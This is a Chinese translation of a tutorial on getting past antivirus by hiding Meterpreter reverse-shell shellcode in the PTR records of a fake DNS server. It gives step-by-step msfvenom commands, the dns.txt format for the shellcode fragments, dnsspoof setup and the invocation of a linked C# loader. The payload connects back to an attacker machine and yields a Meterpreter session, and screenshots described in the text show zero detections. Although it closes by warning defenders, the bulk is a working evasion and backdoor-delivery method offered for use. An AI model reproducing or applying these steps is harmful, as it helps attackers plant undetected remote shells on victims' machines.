> 原文链接: https://www.anquanke.com//post/id/85431 


# 【技术分享】通过DNS传输后门来绕过杀软


                                阅读量   
                                **122012**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：linkedin.com
                                <br>原文地址：[https://www.linkedin.com/pulse/bypassing-anti-viruses-transfer-backdoor-payloads-dns-mohammadbagher](https://www.linkedin.com/pulse/bypassing-anti-viruses-transfer-backdoor-payloads-dns-mohammadbagher)

译文仅供参考，具体内容表达以及含义原文为准

****

[![](https://p5.ssl.qhimg.com/t015385087e2682a773.jpg)](https://p5.ssl.qhimg.com/t015385087e2682a773.jpg)

翻译：[江南忆](http://bobao.360.cn/member/contribute?uid=2829645635)

预估稿费：200RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

**<br>**

**前言**

在本篇文章里，我想解释怎么样不使用加密数据的方法也能绕过杀软，同时我也想在github上分享源代码。[https://github.com/DamonMohammadbagher/NativePayload_DNS](https://github.com/DamonMohammadbagher/NativePayload_DNS) 

我想使用DNS协议来传输我的后门载荷，从攻击者的机器到客户端机器。这种情况下，我们的后门代码就不需要是硬编码的或者加密的了。

因此被杀软检测出来的风险就很低了。

<br>

**为什么是DNS协议？**

因为在大多数的网络里DNS流量都是有效的，IPS/IDS或者硬件防火墙都不会监控和过滤DNS流量。我知道你可以使用SNORT IPS/IDS或者类似的东西来检测DNS流量，但是在DNS流量里使用特征检测出新的载荷非常困难。当然网络管理员也有可能这么做。

本篇文章我想给你展示一个在DNS的请求和回应流量里隐藏你的载荷的方法。

<br>

**漏洞点在哪儿呢？**

如果你想要在后门文件中利用非加密或者无硬编码的攻击负荷，比如现在这种情况，你需要利用像http,DNS …这样的网络协议把攻击负荷从你的系统传送到目标机上。这种情况下，我们想通过DNS协议传送攻击负荷，并同时在目标机器的内存里执行这些攻击载荷。因此漏洞点在于攻击载荷的位置，还在于杀软检测恶意样本的方式。因为在这种情况下，我们不会保存攻击载荷到文件系统，载荷只是在内存里，流量里。

很不幸运的是，各种杀软为检测恶意代码，监控网络流量，监控及扫描内存的，却不是很有效。甚至大多数杀软不管是否有IPS/IDS特性，都是根本无效的。

例子：后门载荷隐藏在拥有PTR记录和A记录的DNS域中。

[![](https://p4.ssl.qhimg.com/t019a8db0f553f41732.png)](https://p4.ssl.qhimg.com/t019a8db0f553f41732.png)

图 1：DNS域(IP地址到DNS全称域名)

注：图片一的红色翻译：

第一行：Meterpreter载荷的第一行数据  `{`载荷`}`.1.com

左下方：时间设置，后门核心代码每十分钟重连一次攻击者，每5分钟建立一次连接。1.1.`{`10`}`.`{`5`}`

右下方：绕过比如像Snort对DNS流量的基于特征检测攻击载荷的好办法(可能);-)，拆分攻击载荷到1-5记录。你可以利用NSLOOKUP来还原这些记录，每隔一段时间比如(每2分钟：获取一个记录)

正如你所见，这个DNS域中，我有两个很像是全称域名的PTR类型的记录，隐藏了Meterpreter载荷。还有两个PTR类型的记录保存了后门重连的时间设置，还有一个A类型的记录也是保存了时间设置。

拆分载荷数据到记录!  如果你想绕过防火墙或者IPS/IDS对DNS流量的基于特征的检测。

拆分的一个好办法是，把你的攻击载荷拆分到PTR类型的DNS记录里，或者其他你可以加密载荷并使用的协议里。这取决于你和你的目标网络。

正如图1里，我把Meterpreter载荷的第一行数据拆分到5个记录里。因此这些记录里的载荷等于记录1.1.1.0。

例子: 1.0.1.0 + 1.0.1.1 + 1.0.1.2 + 1.0.1.3 + 1.0.1.4 = 1.1.1.0。

在客户端，你可以使用其他的工具或者技术，从假冒的DNS服务器获取还原出这些载荷。不过，我打算利用NSLOOKUP命令行实时获取，因为我觉得这比较简单。

在图片2，我尝试用NSLOOKUP工具测试假冒的DNS服务器到客户端的DNS流量。

[![](https://p0.ssl.qhimg.com/t01d941e31381e7a178.png)](https://p0.ssl.qhimg.com/t01d941e31381e7a178.png)

图片2：Nslookup命令及DNS流量测试。

注：图2里的红色翻译如下：Meterpreter载荷通过DNS协议传输的流量。现在怎么检测呢？有思路吗？

现在我要讲下，怎么样在Linux里创建假冒的DNS服务器，以及Meterpreter载荷如何保存拆分到DNS记录。最后我要利用我的工具NativePayload_DNS.exe来执行这些载荷，并得到一个Meterpreter连接会话。

步骤1:一步步的创建拥有Meterpreter载荷的假冒DNS服务器：

本步骤中，你可以利用Msfvenom创建一个Meterpreter载荷，像图片4中那样。并把载荷一行一行的拷贝到dns.txt文件中，然后利用DNSSpoof在Kali Linux中创建一个假冒的DNS服务器。

不过我首先展示EXE模式的Meterpreter载荷，并用所有的杀软测试，然后你会发现绝大多数杀软都可以检测出来。

为什么我要展示着一点呢？

因为我想表明给你看，同一个攻击载荷，用两种技术，一是EXE模式，二是DNS传输。你会看到杀软可以检测出EXE模式的载荷，但是不能检测出利用第二个技术”DNS传输”的载荷。但我们知道这两种方法是同一个载荷。

例子1 , EXE模式的载荷: msfvenom –-platform windows –arch x86_64 –p windows/x64/meterpreter/reverse_tcp lhost=192-168-1-50 –f exe &gt; /root/Desktop/payload.exe

下边图3你会看到，我的EXE模式的载荷被11款杀软检测出来了。

[![](https://p1.ssl.qhimg.com/t018a0a7a2802ea6c8c.png)](https://p1.ssl.qhimg.com/t018a0a7a2802ea6c8c.png)

图3：EXE模式的载荷被检测出来了。

好了，现在该用第二种技术了，生成载荷时使用了C类型。

例2 , 第二种技术DNS流量: msfvenom –-platform windows –arch x86_64 –p windows/x64/meterpreter/reverse_tcp lhost=192-168-1-50 –f c &gt; /root/Desktop/payload.txt

生成payload.txt文件后，必须把载荷拷贝到dns.txt，按照图4里的格式，一行一行的拷贝。这非常重要，必须保证dns.txt有正确的格式。因为Linu里的Dnsspoof要用到，格式如下：



```
IP地址 “`{`载荷`}`.域.com”
1.1.1.0 “0xfc0x480x830xe40xf00xe8.1.com”
1.1.1.1“0xbc0xc80x130xff0x100x08.1.com”
```

在这种情况下，因为我的C#后门定制化的用到了域名"1.com"，我们必须使用这个名称作为域名。或者像其他"2.com"，"3.net"，"t.com"，再或者一个字符加".com"作为域名。

所以在这种情况下，IP地址” 1.1.1.x”	里的x就是dns.txt文件里的载荷行数，



```
1.1.1.0 --&gt; payload.txt里的0行 --&gt; “`{`载荷0`}`.1.com”
1.1.1.1 --&gt; payload.txt里的1行  --&gt; “`{`载荷1`}`.1.com”
1.1.1.2 --&gt; payload.txt里的2行  --&gt; “`{`载荷2`}`.1.com”
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0183cc2b3aae83d64d.png)

图4：生成假冒的DNS服务器和Meterpreter载荷的步骤1

生成后的dns.txt文件应该如下图5。

[![](https://p4.ssl.qhimg.com/t018744622c77f25f9b.png)](https://p4.ssl.qhimg.com/t018744622c77f25f9b.png)

图5：dnsspoof用来假冒DNS服务器的Dns.txt文件

好了，现在利用dnsspoof在Linux里生成假冒的DNS服务器，像下图6一样。

[![](https://p1.ssl.qhimg.com/t01d0c130ee2c5e2e76.png)](https://p1.ssl.qhimg.com/t01d0c130ee2c5e2e76.png)

图6：dnsspoof工具

在步骤2中，我们需要一个后门，从假冒的DNS服务器下载攻击载荷，利用的是DNS协议。

在这种情况下，我编写了C#代码来干这件事。我的代码里使用了nslookup.exe发送DNS请求，最终我的代码捕获到了DNS PTR类型回应里的后门载荷。

C# 源代码链接: [https://github.com/DamonMohammadbagher/NativePayload_DNS](https://github.com/DamonMohammadbagher/NativePayload_DNS) 

步骤2：

源代码编译后，生成的exe，按照如下的命令语法执行：

命令语法: NativePayload_DNS.exe 	“起始IP地址”  计数   “假冒DNS服务器IP地址”

例如: C:&gt; NativePayload_DNS.exe 	“1.1.1.” 		34 		“192.168.1.50”

起始IP地址：是你PTR记录里的第一个IP地址，不包含最后一节。对于域名ID `{` 1 . 1 . 1 . `}`你需要输入三个1.作为参数。

计数：是DNS PTR类型记录的个数，在这种情况下，我们dns.txt 文件里的1.1.1.0 …. 1.1.1.33，所以这个计数是34。

假冒DNS服务器IP地址：是我们或者说是攻击者的假冒的DNS服务器IP地址，在这种情况下，我们的kali linux ip地址是192-168-1-50。

在执行后门之前，你要记住，必须确保kali linux里的Metasploit监听在IP地址192-168-1-50。

现在你可以像图7一样执行后门了：

NativePayload_DNS.exe			 1.1.1.  		34  		192.168.1.50

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c0a6457e828b9752.png)

图7：NativePayload_DNS 工具

正如图7里，后门尝试发送DNS请求IP地址1.1.1.x，并得到了PTR或者FQDN类型记录的回应。在下一张图里，你会发现客户端和假冒DNS服务器之间的网络流量。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01000dea30ee3e8173.png)

图8：利用DNS流量传送Meterpreter载荷

最终34个记录倒计时完成之后，你会在攻击者那端得到一个Meterpreter连接会话，像图9里的。而且不幸的是，我的杀软没检测出来这种技术。我认为大多数的杀软都无法检测出来，如果你用其他杀软测试了这个技术，请在评论里留言告诉我结果，还有哪款杀软和版本;)。谢谢你伙计。

[![](https://p3.ssl.qhimg.com/t01e9303b6889aeca8c.png)](https://p3.ssl.qhimg.com/t01e9303b6889aeca8c.png)

图9：利用DNS协议的Meterpreter会话连接

你会看到我的杀软再一次被绕过了;-)，这是用所有杀软扫描我的源代码的结果，你可以比较图3和图10。两个后门使用同样的载荷。

[![](https://p5.ssl.qhimg.com/t017d696b86298bef3a.png)](https://p5.ssl.qhimg.com/t017d696b86298bef3a.png)

图 10: NativePayload_DNS (AVs结果 = 0 被检测)

下张图你会看到C#源代码使用了NSLOOKUP工具的背后究竟发生了什么。

[![](https://p1.ssl.qhimg.com/t0113187477f44761f5.png)](https://p1.ssl.qhimg.com/t0113187477f44761f5.png)

图11：Nslookup 和 UDP连接

最终你会在tcpview和putty里看到我的Meterpreter会话，见下图：

[![](https://p4.ssl.qhimg.com/t01381f8e438d269ac7.png)](https://p4.ssl.qhimg.com/t01381f8e438d269ac7.png)

图12：Tcpview以及TCP有效连接，当后门载荷被从假冒的DNS服务器下载下来后。

在图13里，你同样可以看到Meterpreter会话：

[![](https://p4.ssl.qhimg.com/t014e62cb6dcc24c010.png)](https://p4.ssl.qhimg.com/t014e62cb6dcc24c010.png)

图13：Meterpreter会话。

一目了然：你不能相信杀软总是可以防范网络中攻击载荷的传输，如果通过这种技术或者其他的方法来传送攻击载荷的话，哪怕是使用其他协议。你的网络和客户端/服务器是很脆弱的。所以请用你自己的杀软测试这个技术，并分享你的经验，在评论里留言告诉我(也许这件事我说错了，也许没有)。
